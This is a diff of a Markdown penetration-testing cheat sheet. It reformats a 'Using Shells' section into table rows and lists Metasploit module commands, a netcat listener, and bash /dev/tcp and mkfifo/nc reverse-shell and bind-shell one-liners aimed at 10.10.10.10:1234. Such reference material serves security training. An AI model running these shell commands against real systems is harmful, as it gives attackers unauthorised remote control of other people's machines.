@@ -61,22 +61,11 @@
 `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option
 `check` | MSF: Test if the target server is vulnerable
 `exploit` | MSF: Run the exploit on the target server is vulnerable
-
-**Using Shells**
-
-`nc -lvnp 1234`
-
-Start a  `nc`  listener on a local port
-
-`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
-
-Send a reverse shell from the remote server
-
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
-
-Another command to send a reverse shell from the remote server
-
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
+**Using Shells** | 
+`nc -lvnp 1234` | Start a  `nc`  listener on a local port
+`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`| Another command to send a reverse shell from the remote server
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` |
 
 Start a bind shell on the remote server
 
@@ -164,5 +153,5 @@ Convert a file from  `base64`  back to its orig
 
 Check the file's  `md5sum`  to ensure it converted correctly
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTU5MDkzNDQ2NV19
+eyJoaXN0b3J5IjpbMzU2OTIyNjY1XX0=
 -->
